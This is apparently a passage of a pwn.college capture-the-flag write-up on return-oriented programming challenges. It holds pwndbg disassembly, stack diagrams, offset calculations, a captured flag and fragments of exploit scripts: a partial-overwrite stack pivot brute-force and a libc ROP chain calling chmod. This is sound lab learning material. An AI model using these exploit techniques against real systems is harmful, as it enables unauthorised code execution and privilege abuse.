...
Stack:
    ...
    rbp --> 0x7fff122d4e70 │  00 00 7f ff 12 2d 4d f8  │ 
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
rsp rip --> 0x7fff122d4e78 │  .. .. .. .. .. .. 40 b2  │ --> ( mov rsp, rbp ; pop rbp ; ret within main() )
                           └───────────────────────────┘
                           ╎  .. .. .. .. .. .. .. ..  ╎
...
Stack:
    ...
    rbp --> 0x7fff122d4e70 │  00 00 7f ff 12 2d 4d f8  │ 
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
    rip --> 0x7fff122d4e78 │  .. .. .. .. .. .. 40 b2  │ --> ( mov rsp, rbp ; pop rbp ; ret within main() )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
    rsp --> 0x7fff122d4e80 │  .. .. .. .. .. .. .. ..  │
                           └───────────────────────────┘
                           ╎  .. .. .. .. .. .. .. ..  ╎
...
Stack:
    ...
    rbp --> 0x7ffe4e08de80 │  00 00 7f fe 4e 08 dd f8  │ 
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
rsp rip --> 0x7ffe4e08de88 │  .. .. .. .. .. .. 95 86  │ --> ( leave ; ret within main() )
                           └───────────────────────────┘
                           ╎  .. .. .. .. .. .. .. ..  ╎
...
Stack:
    ...
    rbp --> 0x7ffe4e08de80 │  00 00 7f fe 4e 08 dd f8  │ 
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
    rip --> 0x7ffe4e08de88 │  .. .. .. .. .. .. 95 86  │ --> ( leave ; ret within main() )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
    rsp --> 0x7ffe4e08de88 │  .. .. .. .. .. .. .. ..  │ 
                           └───────────────────────────┘
                           ╎  .. .. .. .. .. .. .. ..  ╎
...
# Generate all 4096 possible 3-byte patterns for leave ; ret at libc offset 0x578c8
patterns = []
for b2 in range(256):
    for N in range(16):
        val = (b2 * 0x10000 + N * 0x1000 + 0x578c8) & 0xFFFFFF
...
for pat in patterns * 20:
    ...
    try:
        ...
        # Pivot logic
        # win_ptr is at buf-8.
        # Target RBP at buf-16 makes RSP land on win_ptr after 'pop rbp'.
        target_rbp = buf - 16

        # 3-byte partial overwrite payload
        payload = flat(
            b"A" * rbp_offset,
            target_rbp,
            pat
...
```
hacker@return-oriented-programming~guarded-gadgets-easy:~$ /challenge/guarded-gadgets-easy 
###
### Welcome to /challenge/guarded-gadgets-easy!
###
...
because it could be interpreted as return addresses.
You can use gadgets that shift the stack appropriately to avoid that.
[LEAK] Your input buffer is located at: 0x7fff181df710.

This will simulate an 8-byte arbitrary read.
...
pwndbg> disassemble main
Dump of assembler code for function main:
   0x000000000000226d <+0>:     endbr64
   0x0000000000002271 <+4>:     push   rbp
   0x0000000000002272 <+5>:     mov    rbp,rsp
   0x0000000000002275 <+8>:     sub    rsp,0xa0
   0x000000000000227c <+15>:    mov    DWORD PTR [rbp-0x84],edi
   0x0000000000002282 <+21>:    mov    QWORD PTR [rbp-0x90],rsi
   0x0000000000002289 <+28>:    mov    QWORD PTR [rbp-0x98],rdx
   0x0000000000002290 <+35>:    mov    rax,QWORD PTR fs:0x28
   0x0000000000002299 <+44>:    mov    QWORD PTR [rbp-0x8],rax
   0x000000000000229d <+48>:    xor    eax,eax
   0x000000000000229f <+50>:    mov    rax,QWORD PTR [rip+0x2d7a]        # 0x5020 <stdin@@GLIBC_2.2.5>
   0x00000000000022a6 <+57>:    mov    ecx,0x0
   0x00000000000022ab <+62>:    mov    edx,0x2
   0x00000000000022b0 <+67>:    mov    esi,0x0
   0x00000000000022b5 <+72>:    mov    rdi,rax
   0x00000000000022b8 <+75>:    call   0x11c0 <setvbuf@plt>
   0x00000000000022bd <+80>:    mov    rax,QWORD PTR [rip+0x2d4c]        # 0x5010 <stdout@@GLIBC_2.2.5>
   0x00000000000022c4 <+87>:    mov    ecx,0x0
   0x00000000000022c9 <+92>:    mov    edx,0x2
   0x00000000000022ce <+97>:    mov    esi,0x0
   0x00000000000022d3 <+102>:   mov    rdi,rax
   0x00000000000022d6 <+105>:   call   0x11c0 <setvbuf@plt>
   0x00000000000022db <+110>:   lea    rdi,[rip+0xeb6]        # 0x3198
   0x00000000000022e2 <+117>:   call   0x1140 <puts@plt>
   0x00000000000022e7 <+122>:   mov    rax,QWORD PTR [rbp-0x90]
   0x00000000000022ee <+129>:   mov    rax,QWORD PTR [rax]
   0x00000000000022f1 <+132>:   mov    rsi,rax
   0x00000000000022f4 <+135>:   lea    rdi,[rip+0xea1]        # 0x319c
   0x00000000000022fb <+142>:   mov    eax,0x0
   0x0000000000002300 <+147>:   call   0x1170 <printf@plt>
   0x0000000000002305 <+152>:   lea    rdi,[rip+0xe8c]        # 0x3198
   0x000000000000230c <+159>:   call   0x1140 <puts@plt>
   0x0000000000002311 <+164>:   mov    edi,0xa
   0x0000000000002316 <+169>:   call   0x1120 <putchar@plt>
   0x000000000000231b <+174>:   mov    eax,DWORD PTR [rbp-0x84]
   0x0000000000002321 <+180>:   mov    DWORD PTR [rbp-0x78],eax
   0x0000000000002324 <+183>:   mov    rax,QWORD PTR [rbp-0x90]
   0x000000000000232b <+190>:   mov    QWORD PTR [rbp-0x68],rax
   0x000000000000232f <+194>:   mov    rax,QWORD PTR [rbp-0x98]
   0x0000000000002336 <+201>:   mov    QWORD PTR [rbp-0x60],rax
   0x000000000000233a <+205>:   lea    rdi,[rip+0xe6f]        # 0x31b0
   0x0000000000002341 <+212>:   call   0x1140 <puts@plt>
   0x0000000000002346 <+217>:   lea    rdi,[rip+0xedb]        # 0x3228
   0x000000000000234d <+224>:   call   0x1140 <puts@plt>
   0x0000000000002352 <+229>:   mov    rax,rsp
   0x0000000000002355 <+232>:   mov    QWORD PTR [rip+0x2d04],rax        # 0x5060 <sp_>
   0x000000000000235c <+239>:   mov    rax,rbp
   0x000000000000235f <+242>:   mov    QWORD PTR [rip+0x2cda],rax        # 0x5040 <bp_>
   0x0000000000002366 <+249>:   mov    rdx,QWORD PTR [rip+0x2cd3]        # 0x5040 <bp_>
   0x000000000000236d <+256>:   mov    rax,QWORD PTR [rip+0x2cec]        # 0x5060 <sp_>
   0x0000000000002374 <+263>:   sub    rdx,rax
   0x0000000000002377 <+266>:   mov    rax,rdx
   0x000000000000237a <+269>:   shr    rax,0x3
   0x000000000000237e <+273>:   add    rax,0x2
   0x0000000000002382 <+277>:   mov    QWORD PTR [rip+0x2cc7],rax        # 0x5050 <sz_>
   0x0000000000002389 <+284>:   mov    rax,QWORD PTR [rip+0x2cb0]        # 0x5040 <bp_>
   0x0000000000002390 <+291>:   add    rax,0x8
   0x0000000000002394 <+295>:   mov    QWORD PTR [rip+0x2cbd],rax        # 0x5058 <rp_>
   0x000000000000239b <+302>:   lea    rdi,[rip+0xeee]        # 0x3290
   0x00000000000023a2 <+309>:   call   0x1140 <puts@plt>
   0x00000000000023a7 <+314>:   lea    rdi,[rip+0xf62]        # 0x3310
   0x00000000000023ae <+321>:   call   0x1140 <puts@plt>
   0x00000000000023b3 <+326>:   lea    rdi,[rip+0xfce]        # 0x3388
   0x00000000000023ba <+333>:   call   0x1140 <puts@plt>
   0x00000000000023bf <+338>:   lea    rdi,[rip+0x103a]        # 0x3400
   0x00000000000023c6 <+345>:   call   0x1140 <puts@plt>
   0x00000000000023cb <+350>:   lea    rdi,[rip+0x10a6]        # 0x3478
   0x00000000000023d2 <+357>:   call   0x1140 <puts@plt>
   0x00000000000023d7 <+362>:   lea    rdi,[rip+0x10ea]        # 0x34c8
   0x00000000000023de <+369>:   call   0x1140 <puts@plt>
   0x00000000000023e3 <+374>:   lea    rdi,[rip+0x1116]        # 0x3500
   0x00000000000023ea <+381>:   call   0x1140 <puts@plt>
   0x00000000000023ef <+386>:   lea    rdi,[rip+0x113a]        # 0x3530
   0x00000000000023f6 <+393>:   call   0x1140 <puts@plt>
   0x00000000000023fb <+398>:   lea    rdi,[rip+0x116e]        # 0x3570
   0x0000000000002402 <+405>:   call   0x1140 <puts@plt>
   0x0000000000002407 <+410>:   lea    rdi,[rip+0x1182]        # 0x3590
   0x000000000000240e <+417>:   call   0x1140 <puts@plt>
   0x0000000000002413 <+422>:   lea    rdi,[rip+0x11ae]        # 0x35c8
   0x000000000000241a <+429>:   call   0x1140 <puts@plt>
   0x000000000000241f <+434>:   lea    rdi,[rip+0x11da]        # 0x3600
   0x0000000000002426 <+441>:   call   0x1140 <puts@plt>
   0x000000000000242b <+446>:   lea    rax,[rbp-0x50]
   0x000000000000242f <+450>:   mov    rsi,rax
   0x0000000000002432 <+453>:   lea    rdi,[rip+0x120f]        # 0x3648
   0x0000000000002439 <+460>:   mov    eax,0x0
   0x000000000000243e <+465>:   call   0x1170 <printf@plt>
   0x0000000000002443 <+470>:   lea    rdi,[rip+0x122e]        # 0x3678
   0x000000000000244a <+477>:   call   0x1140 <puts@plt>
   0x000000000000244f <+482>:   mov    QWORD PTR [rbp-0x70],0x0
   0x0000000000002457 <+490>:   lea    rdi,[rip+0x1247]        # 0x36a5
   0x000000000000245e <+497>:   call   0x1140 <puts@plt>
   0x0000000000002463 <+502>:   lea    rax,[rbp-0x70]
   0x0000000000002467 <+506>:   mov    rsi,rax
   0x000000000000246a <+509>:   lea    rdi,[rip+0x1251]        # 0x36c2
   0x0000000000002471 <+516>:   mov    eax,0x0
   0x0000000000002476 <+521>:   call   0x11e0 <__isoc99_scanf@plt>
   0x000000000000247b <+526>:   mov    rax,QWORD PTR [rbp-0x70]
   0x000000000000247f <+530>:   mov    rax,QWORD PTR [rax]
   0x0000000000002482 <+533>:   mov    QWORD PTR [rbp-0x58],rax
   0x0000000000002486 <+537>:   mov    rax,QWORD PTR [rbp-0x70]
   0x000000000000248a <+541>:   mov    rdx,QWORD PTR [rbp-0x58]
   0x000000000000248e <+545>:   mov    rsi,rax
   0x0000000000002491 <+548>:   lea    rdi,[rip+0x122d]        # 0x36c5
   0x0000000000002498 <+555>:   mov    eax,0x0
   0x000000000000249d <+560>:   call   0x1170 <printf@plt>
   0x00000000000024a2 <+565>:   lea    rax,[rbp-0x50]
   0x00000000000024a6 <+569>:   mov    edx,0x1000
   0x00000000000024ab <+574>:   mov    rsi,rax
   0x00000000000024ae <+577>:   mov    edi,0x0
   0x00000000000024b3 <+582>:   call   0x1180 <read@plt>
   0x00000000000024b8 <+587>:   mov    DWORD PTR [rbp-0x74],eax
   0x00000000000024bb <+590>:   mov    eax,DWORD PTR [rbp-0x74]
   0x00000000000024be <+593>:   cdqe
   0x00000000000024c0 <+595>:   lea    rcx,[rbp-0x50]
   0x00000000000024c4 <+599>:   mov    rdx,QWORD PTR [rip+0x2b8d]        # 0x5058 <rp_>
   0x00000000000024cb <+606>:   sub    rcx,rdx
   0x00000000000024ce <+609>:   mov    rdx,rcx
   0x00000000000024d1 <+612>:   add    rax,rdx
   0x00000000000024d4 <+615>:   shr    rax,0x3
   0x00000000000024d8 <+619>:   mov    rdx,rax
   0x00000000000024db <+622>:   mov    eax,DWORD PTR [rbp-0x74]
   0x00000000000024de <+625>:   mov    esi,eax
   0x00000000000024e0 <+627>:   lea    rdi,[rip+0x11f9]        # 0x36e0
   0x00000000000024e7 <+634>:   mov    eax,0x0
   0x00000000000024ec <+639>:   call   0x1170 <printf@plt>
   0x00000000000024f1 <+644>:   lea    rdi,[rip+0x1220]        # 0x3718
   0x00000000000024f8 <+651>:   call   0x1140 <puts@plt>
   0x00000000000024fd <+656>:   lea    rdi,[rip+0x127c]        # 0x3780
   0x0000000000002504 <+663>:   call   0x1140 <puts@plt>
   0x0000000000002509 <+668>:   mov    eax,DWORD PTR [rbp-0x74]
   0x000000000000250c <+671>:   cdqe
   0x000000000000250e <+673>:   lea    rcx,[rbp-0x50]
   0x0000000000002512 <+677>:   mov    rdx,QWORD PTR [rip+0x2b3f]        # 0x5058 <rp_>
   0x0000000000002519 <+684>:   sub    rcx,rdx
   0x000000000000251c <+687>:   mov    rdx,rcx
   0x000000000000251f <+690>:   add    rax,rdx
   0x0000000000002522 <+693>:   shr    rax,0x3
   0x0000000000002526 <+697>:   add    eax,0x1
   0x0000000000002529 <+700>:   mov    edx,eax
   0x000000000000252b <+702>:   mov    rax,QWORD PTR [rip+0x2b26]        # 0x5058 <rp_>
   0x0000000000002532 <+709>:   mov    esi,edx
   0x0000000000002534 <+711>:   mov    rdi,rax
   0x0000000000002537 <+714>:   call   0x1718 <print_chain>
   0x000000000000253c <+719>:   lea    rdi,[rip+0x127f]        # 0x37c2
   0x0000000000002543 <+726>:   call   0x1140 <puts@plt>
   0x0000000000002548 <+731>:   nop
   0x0000000000002549 <+732>:   lea    rdi,[rip+0x127b]        # 0x37cb
   0x0000000000002550 <+739>:   call   0x1140 <puts@plt>
   0x0000000000002555 <+744>:   mov    eax,0x0
   0x000000000000255a <+749>:   mov    rsi,QWORD PTR [rbp-0x8]
   0x000000000000255e <+753>:   xor    rsi,QWORD PTR fs:0x28
   0x0000000000002567 <+762>:   je     0x256e <main+769>
   0x0000000000002569 <+764>:   call   0x1160 <__stack_chk_fail@plt>
   0x000000000000256e <+769>:   leave
   0x000000000000256f <+770>:   ret
End of assembler dump.
```
...
Breakpoint 1 at 0x24b3
```

```
pwndbg> run
Starting program: /challenge/guarded-gadgets-easy 
Downloading separate debug info for system-supplied DSO at 0x7ffe0e948000
Download failed: Invalid argument.  Continuing without separate debug info for system-supplied DSO at 0x7ffe0e948000.                                                                  
Downloading separate debug info for /lib/libcapstone.so.5
Download failed: Invalid argument.  Continuing without separate debug info for /lib/libcapstone.so.5.                                                                                  
###
### Welcome to /challenge/guarded-gadgets-easy!
...
[LEAK] Your input buffer is located at: 0x7ffe0e9228a0.

This will simulate an 8-byte arbitrary read.
Address in hex to read from:
0x7ffe0e9228a0
[LEAK] *0x7ffe0e9228a0 = 0x00000000000000c2


Breakpoint 1, 0x00005e1c69bd94b3 in main ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
────────────────────────────────────────────────────────────────────────────────────[ LAST SIGNAL ]────────────────────────────────────────────────────────────────────────────────────
Breakpoint hit at 0x5e1c69bd94b3
────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────────────────────────────────────────────
 RAX  0x7ffe0e9228a0 ◂— 0xc2
 RBX  0x5e1c69bd9570 (__libc_csu_init) ◂— endbr64
 RCX  0
 RDX  0x1000
 RDI  0
 RSI  0x7ffe0e9228a0 ◂— 0xc2
 R8   0x2d
 R9   0x2d
 R10  0x5e1c69bda6db ◂— 0x6365520000000a0a /* '\n\n' */
 R11  0x246
 R12  0x5e1c69bd8200 (_start) ◂— endbr64
 R13  0x7ffe0e9229e0 ◂— 1
 R14  0
 R15  0
...
─────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────────────────────────────────────────────
 ► 0x5e1c69bd94b3 <main+582>    call   read@plt                    <read@plt>
        fd: 0 (/dev/pts/1)
        buf: 0x7ffe0e9228a0 ◂— 0xc2
        nbytes: 0x1000
 
   0x5e1c69bd94b8 <main+587>    mov    dword ptr [rbp - 0x74], eax
   0x5e1c69bd94bb <main+590>    mov    eax, dword ptr [rbp - 0x74]
   0x5e1c69bd94be <main+593>    cdqe  
   0x5e1c69bd94c0 <main+595>    lea    rcx, [rbp - 0x50]
   0x5e1c69bd94c4 <main+599>    mov    rdx, qword ptr [rip + 0x2b8d]     RDX, [rp_]
   0x5e1c69bd94cb <main+606>    sub    rcx, rdx
   0x5e1c69bd94ce <main+609>    mov    rdx, rcx
   0x5e1c69bd94d1 <main+612>    add    rax, rdx
   0x5e1c69bd94d4 <main+615>    shr    rax, 3
   0x5e1c69bd94d8 <main+619>    mov    rdx, rax
───────────────────────────────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────────────────────────────
00:0000│ rsp 0x7ffe0e922850 ◂— 0
01:0008│-098 0x7ffe0e922858 —▸ 0x7ffe0e9229f8 —▸ 0x7ffe0e922ea3 ◂— 'SHELL=/run/dojo/bin/bash'
02:0010│-090 0x7ffe0e922860 —▸ 0x7ffe0e9229e8 —▸ 0x7ffe0e922e83 ◂— '/challenge/guarded-gadgets-easy'
03:0018│-088 0x7ffe0e922868 ◂— 0x100000000
04:0020│-080 0x7ffe0e922870 ◂— 0
05:0028│-078 0x7ffe0e922878 ◂— 1
06:0030│-070 0x7ffe0e922880 —▸ 0x7ffe0e9228a0 ◂— 0xc2
07:0038│-068 0x7ffe0e922888 —▸ 0x7ffe0e9229e8 —▸ 0x7ffe0e922e83 ◂— '/challenge/guarded-gadgets-easy'
─────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────────────────────────────────────
 ► 0   0x5e1c69bd94b3 main+582
   1   0x737019aac083 __libc_start_main+243
   2   0x5e1c69bd822e _start+46
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```
...
```
pwndbg> info frame
Stack level 0, frame at 0x7ffe0e922900:
 rip = 0x5e1c69bd94b3 in main; saved rip = 0x737019aac083
 called by frame at 0x7ffe0e9229d0
 Arglist at 0x7ffe0e9228f0, args: 
 Locals at 0x7ffe0e9228f0, Previous frame's sp is 0x7ffe0e922900
 Saved registers:
  rbp at 0x7ffe0e9228f0, rip at 0x7ffe0e9228f8
```

Just need to calculate the differences now.

```
pwndbg> p/d 0x7ffe0e9228e8 - 0x7ffe0e9228a0
$1 = 72
pwndbg> p/d 0x7ffe0e9228f8 - 0x7ffe0e9228a0
$2 = 88
```
...
```
hacker@return-oriented-programming~guarded-gadgets-easy:~$ ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 | grep "pop rdi ; ret"
...
Stack:
                           ┌───────────────────────────┐
    rsi --> 0x7ffe0e922910 │  21 00 41 41 41 41 41 41  │ ( b"!\x00AAAAAA" )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
                      .... │  .. .. .. .. .. .. .. ..  │ ....
                      .... │  .. .. .. .. .. .. .. ..  │ ....
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
    ...
    rsp --> 0x7ffe0e922968 │   libc base + 0x23b6a     │ --> ( pop rdi ; ret )
            ...
            0x7ffe0e922978 │   libc base + 0x2601f     │ --> ( pop rsi ; ret )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffe0e922980 │  00 00 00 00 00 00 01 ff  │ ( 0o777 )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffe0e922988 │   libc base + 0x10dd80    │ --> ( chmod in libc )
                           └───────────────────────────┘
                           ╎  .. .. .. .. .. .. .. ..  ╎
...
Stack:
                           ┌───────────────────────────┐
    rsp --> 0x7ffe0e922978 │   libc base + 0x2601f     │ --> ( pop rsi ; ret )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffe0e922980 │  00 00 00 00 00 00 01 ff  │ ( 0o777 )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffe0e922988 │   libc base + 0x10dd80    │ --> ( chmod in libc )
...
Stack:
                           ┌───────────────────────────┐
    rsp --> 0x7ffe0e922980 │  00 00 00 00 00 00 01 ff  │ ( 0o777 )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffe0e922988 │   libc base + 0x10dd80    │ --> ( chmod in libc )
                           └───────────────────────────┘
                           ╎  .. .. .. .. .. .. .. ..  ╎
...
Stack:
                           ┌───────────────────────────┐
    rsp --> 0x7ffe0e922988 │   libc base + 0x10dd80    │ --> ( chmod in libc )
                           └───────────────────────────┘
                           ╎  .. .. .. .. .. .. .. ..  ╎
...
TARGET_LOW16 = TARGET_OFF & 0xFFFF
...
for attempt in range(200):
    ...
    try:
        ...
        # Compute gadget and function addresses from libc base
...
```
hacker@return-oriented-programming~guarded-gadgets-hard:~$ /challenge/guarded-gadgets-hard 
###
### Welcome to /challenge/guarded-gadgets-hard!
###

[LEAK] Your input buffer is located at: 0x7ffe23227280.
...
pwndbg> disassemble main
Dump of assembler code for function main:
   0x00000000000018e6 <+0>:     endbr64
   0x00000000000018ea <+4>:     push   rbp
   0x00000000000018eb <+5>:     mov    rbp,rsp
   0x00000000000018ee <+8>:     sub    rsp,0xd0
   0x00000000000018f5 <+15>:    mov    DWORD PTR [rbp-0xb4],edi
   0x00000000000018fb <+21>:    mov    QWORD PTR [rbp-0xc0],rsi
   0x0000000000001902 <+28>:    mov    QWORD PTR [rbp-0xc8],rdx
   0x0000000000001909 <+35>:    mov    rax,QWORD PTR fs:0x28
   0x0000000000001912 <+44>:    mov    QWORD PTR [rbp-0x8],rax
   0x0000000000001916 <+48>:    xor    eax,eax
   0x0000000000001918 <+50>:    lea    rdi,[rip+0x6e9]        # 0x2008
   0x000000000000191f <+57>:    call   0x10c0 <puts@plt>
   0x0000000000001924 <+62>:    mov    rax,QWORD PTR [rbp-0xc0]
   0x000000000000192b <+69>:    mov    rax,QWORD PTR [rax]
   0x000000000000192e <+72>:    mov    rsi,rax
   0x0000000000001931 <+75>:    lea    rdi,[rip+0x6d4]        # 0x200c
   0x0000000000001938 <+82>:    mov    eax,0x0
   0x000000000000193d <+87>:    call   0x10e0 <printf@plt>
   0x0000000000001942 <+92>:    lea    rdi,[rip+0x6bf]        # 0x2008
   0x0000000000001949 <+99>:    call   0x10c0 <puts@plt>
   0x000000000000194e <+104>:   mov    edi,0xa
   0x0000000000001953 <+109>:   call   0x10b0 <putchar@plt>
   0x0000000000001958 <+114>:   mov    rax,QWORD PTR [rip+0x26c1]        # 0x4020 <stdin@@GLIBC_2.2.5>
   0x000000000000195f <+121>:   mov    ecx,0x0
   0x0000000000001964 <+126>:   mov    edx,0x2
   0x0000000000001969 <+131>:   mov    esi,0x0
   0x000000000000196e <+136>:   mov    rdi,rax
   0x0000000000001971 <+139>:   call   0x1100 <setvbuf@plt>
   0x0000000000001976 <+144>:   mov    rax,QWORD PTR [rip+0x2693]        # 0x4010 <stdout@@GLIBC_2.2.5>
   0x000000000000197d <+151>:   mov    ecx,0x1
   0x0000000000001982 <+156>:   mov    edx,0x2
   0x0000000000001987 <+161>:   mov    esi,0x0
   0x000000000000198c <+166>:   mov    rdi,rax
   0x000000000000198f <+169>:   call   0x1100 <setvbuf@plt>
   0x0000000000001994 <+174>:   mov    eax,DWORD PTR [rbp-0xb4]
   0x000000000000199a <+180>:   mov    DWORD PTR [rbp-0xa8],eax
   0x00000000000019a0 <+186>:   mov    rax,QWORD PTR [rbp-0xc0]
   0x00000000000019a7 <+193>:   mov    QWORD PTR [rbp-0x98],rax
   0x00000000000019ae <+200>:   mov    rax,QWORD PTR [rbp-0xc8]
   0x00000000000019b5 <+207>:   mov    QWORD PTR [rbp-0x90],rax
   0x00000000000019bc <+214>:   lea    rax,[rbp-0x80]
   0x00000000000019c0 <+218>:   mov    rsi,rax
   0x00000000000019c3 <+221>:   lea    rdi,[rip+0x656]        # 0x2020
   0x00000000000019ca <+228>:   mov    eax,0x0
   0x00000000000019cf <+233>:   call   0x10e0 <printf@plt>
   0x00000000000019d4 <+238>:   mov    QWORD PTR [rbp-0xa0],0x0
   0x00000000000019df <+249>:   lea    rdi,[rip+0x668]        # 0x204e
   0x00000000000019e6 <+256>:   call   0x10c0 <puts@plt>
   0x00000000000019eb <+261>:   lea    rax,[rbp-0xa0]
   0x00000000000019f2 <+268>:   mov    rsi,rax
   0x00000000000019f5 <+271>:   lea    rdi,[rip+0x66f]        # 0x206b
   0x00000000000019fc <+278>:   mov    eax,0x0
   0x0000000000001a01 <+283>:   call   0x1110 <__isoc99_scanf@plt>
   0x0000000000001a06 <+288>:   mov    rax,QWORD PTR [rbp-0xa0]
   0x0000000000001a0d <+295>:   mov    rax,QWORD PTR [rax]
   0x0000000000001a10 <+298>:   mov    QWORD PTR [rbp-0x88],rax
   0x0000000000001a17 <+305>:   mov    rax,QWORD PTR [rbp-0xa0]
   0x0000000000001a1e <+312>:   mov    rdx,QWORD PTR [rbp-0x88]
   0x0000000000001a25 <+319>:   mov    rsi,rax
   0x0000000000001a28 <+322>:   lea    rdi,[rip+0x63f]        # 0x206e
   0x0000000000001a2f <+329>:   mov    eax,0x0
   0x0000000000001a34 <+334>:   call   0x10e0 <printf@plt>
   0x0000000000001a39 <+339>:   lea    rax,[rbp-0x80]
   0x0000000000001a3d <+343>:   mov    edx,0x1000
   0x0000000000001a42 <+348>:   mov    rsi,rax
   0x0000000000001a45 <+351>:   mov    edi,0x0
   0x0000000000001a4a <+356>:   call   0x10f0 <read@plt>
   0x0000000000001a4f <+361>:   mov    DWORD PTR [rbp-0xa4],eax
   0x0000000000001a55 <+367>:   lea    rdi,[rip+0x62b]        # 0x2087
   0x0000000000001a5c <+374>:   call   0x10c0 <puts@plt>
   0x0000000000001a61 <+379>:   nop
   0x0000000000001a62 <+380>:   lea    rdi,[rip+0x627]        # 0x2090
   0x0000000000001a69 <+387>:   call   0x10c0 <puts@plt>
   0x0000000000001a6e <+392>:   mov    eax,0x0
   0x0000000000001a73 <+397>:   mov    rcx,QWORD PTR [rbp-0x8]
   0x0000000000001a77 <+401>:   xor    rcx,QWORD PTR fs:0x28
   0x0000000000001a80 <+410>:   je     0x1a87 <main+417>
   0x0000000000001a82 <+412>:   call   0x10d0 <__stack_chk_fail@plt>
   0x0000000000001a87 <+417>:   leave
   0x0000000000001a88 <+418>:   ret
End of assembler dump.
```
...
Breakpoint 1 at 0x1a4a
```

```
pwndbg> run
Starting program: /challenge/guarded-gadgets-hard 
Downloading separate debug info for system-supplied DSO at 0x7ffcf13f9000
Download failed: Invalid argument.  Continuing without separate debug info for system-supplied DSO at 0x7ffcf13f9000.                                                                  
###
### Welcome to /challenge/guarded-gadgets-hard!
###

[LEAK] Your input buffer is located at: 0x7ffcf1340c70.

Address in hex to read from:
0x7ffcf1340c70
[LEAK] *0x7ffcf1340c70 = 0x0000000000000000


Breakpoint 1, 0x0000641a475e0a4a in main ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
────────────────────────────────────────────────────────────────────────────────────[ LAST SIGNAL ]────────────────────────────────────────────────────────────────────────────────────
Breakpoint hit at 0x641a475e0a4a
────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────────────────────────────────────────────
 RAX  0x7ffcf1340c70 ◂— 0
 RBX  0x641a475e0a90 (__libc_csu_init) ◂— endbr64
 RCX  0
 RDX  0x1000
 RDI  0
 RSI  0x7ffcf1340c70 ◂— 0
 R8   0x2d
 R9   0x2d
 R10  0x641a475e1084 ◂— 0x697661654c000a0a /* '\n\n' */
 R11  0x246
 R12  0x641a475e0120 (_start) ◂— endbr64
 R13  0x7ffcf1340de0 ◂— 1
 R14  0
 R15  0
...
02:0010│-0c0 0x7ffcf1340c30 —▸ 0x7ffcf1340de8 —▸ 0x7ffcf1342e83 ◂— '/challenge/guarded-gadgets-hard'
03:0018│-0b8 0x7ffcf1340c38 ◂— 0x100000000
04:0020│-0b0 0x7ffcf1340c40 ◂— 0
05:0028│-0a8 0x7ffcf1340c48 ◂— 1
06:0030│-0a0 0x7ffcf1340c50 —▸ 0x7ffcf1340c70 ◂— 0
07:0038│-098 0x7ffcf1340c58 —▸ 0x7ffcf1340de8 —▸ 0x7ffcf1342e83 ◂— '/challenge/guarded-gadgets-hard'
─────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────────────────────────────────────
 ► 0   0x641a475e0a4a main+356
   1   0x757e58b54083 __libc_start_main+243
   2   0x641a475e014e _start+46
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```
...
```
pwndbg> info frame
Stack level 0, frame at 0x7ffcf1340d00:
 rip = 0x641a475e0a4a in main; saved rip = 0x757e58b54083
 called by frame at 0x7ffcf1340dd0
 Arglist at 0x7ffcf1340cf0, args: 
 Locals at 0x7ffcf1340cf0, Previous frame's sp is 0x7ffcf1340d00
 Saved registers:
...
```
pwndbg> p/d 0x7ffcf1340ce8 - 0x7ffcf1340c70
$1 = 120
pwndbg> p/d 0x7ffcf1340cf8 - 0x7ffcf1340c70
$2 = 136
```
...
```
hacker@return-oriented-programming~guarded-gadgets-hard:~$ python ~/script.py
pwn.college{cuAFnOlGqi0aaNd1OJwtlLU09th.0lN2MDL4ITM0EzW}
```
...
pwndbg> disassemble challenge
Dump of assembler code for function challenge:
   0x000000000000278a <+0>:     endbr64
   0x000000000000278e <+4>:     push   rbp
   0x000000000000278f <+5>:     mov    rbp,rsp
   0x0000000000002792 <+8>:     sub    rsp,0x70
   0x0000000000002796 <+12>:    mov    DWORD PTR [rbp-0x54],edi
   0x0000000000002799 <+15>:    mov    QWORD PTR [rbp-0x60],rsi
   0x000000000000279d <+19>:    mov    QWORD PTR [rbp-0x68],rdx
   0x00000000000027a1 <+23>:    mov    rax,QWORD PTR fs:0x28
   0x00000000000027aa <+32>:    mov    QWORD PTR [rbp-0x8],rax
